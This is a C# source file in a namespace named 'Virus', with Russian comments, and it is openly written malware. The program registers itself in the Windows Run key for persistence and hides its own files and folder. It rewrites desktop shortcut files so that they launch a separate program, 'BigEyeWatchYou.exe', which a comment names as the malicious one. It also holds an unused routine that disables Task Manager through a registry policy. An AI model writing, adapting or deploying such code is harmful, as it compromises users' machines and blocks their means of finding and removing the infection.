using System;
using System.IO;
using System.Threading;
using Microsoft.Win32;
using ShellLinkChanger;

namespace Virus
{
    class Program
    {

        [STAThread]
        static void Main(string[] args)
        {
            SetStartup();
            HideAll();

            // Получение пути к рабочему столу
            var desktopFolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            var testFolder = @"C:\Users\New\Desktop\Test";

            // Получение файлов ярлыков
            var files = ShellLinkHelper.GetAllShellLinkFiles(testFolder);

            // Получение абсолютного пути к вредоносной программе
            var targetPath = Path.GetFullPath("BigEyeWatchYou.exe");

            foreach (var file in files)
            {
                var link = ShellLinkHelper.GetShellLinkPath(file.FullName);
                if (!link.Path.Contains("BigEyeWatchYou.exe"))
                {
                    ShellLinkHelper.ChangeShellLink(file.FullName, targetPath,
                        QuotedMarked(Path.GetFileNameWithoutExtension(file.Name)));
                }
            }
        }

        /// <summary>
        ///  Methods to manage the task manager 
        /// </summary>
        /// <param name="arg">0 : Enable task Manager  1 : Disable task Manager </param>
        private static void HideTaskManager(int arg)
        {
            RegistryKey currentUser = Registry.CurrentUser;
            RegistryKey system = currentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
            // if system Create an item if it does not exist 
            if (system == null)
            {
                system = currentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            }
            system.SetValue("DisableTaskmgr", arg, RegistryValueKind.DWord);
            currentUser.Close();
        }

        /// <summary>
        /// Оборачивает строку в двойные кавычки
        /// </summary>
        /// <param name="value"></param>
        /// <returns></returns>
        private static string QuotedMarked(string value)
        {
            return $"\"{value}\"";
        }

        /// <summary>
        /// Меняет атрибуты файлов и директории на скрытые
        /// </summary>
        private static void HideAll()
        {
            try
            {
                File.SetAttributes("BigEyeWatchYou.exe", FileAttributes.Hidden);
                File.SetAttributes("Virus.exe", FileAttributes.Hidden);
                new DirectoryInfo(Directory.GetCurrentDirectory()).Attributes |= FileAttributes.Hidden;
            }
            catch { }
        }

        /// <summary>
        /// Добавляет приложение в автозагрузку, если его там нет
        /// </summary>
        private static void SetStartup()
        {

            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            string appFullPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string appName = Path.GetFileNameWithoutExtension(appFullPath);

#if DEBUG
            if (rk.GetValue(appName) != null)
            {
                rk.DeleteValue(appName);
            }
#endif

            if (rk.GetValue(appName) == null)
            {
                

                rk.SetValue(appName, appFullPath);
            }
        }
    }
}
